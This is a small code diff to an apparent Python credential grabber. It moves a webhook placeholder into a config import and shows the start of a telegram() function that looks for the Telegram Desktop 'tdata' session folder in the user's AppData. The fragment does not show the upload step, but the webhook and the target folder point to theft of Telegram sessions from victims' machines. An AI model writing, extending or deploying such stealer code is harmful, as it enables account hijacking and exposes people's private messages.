@@ -1,7 +1,7 @@
 import os, os.path, shutil, requests
+from config import hook
 user = os.path.expanduser("~")
 
-hook = "HOOK_HERE" # U WEBHOOK HERE!
 
 def telegram():
   if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
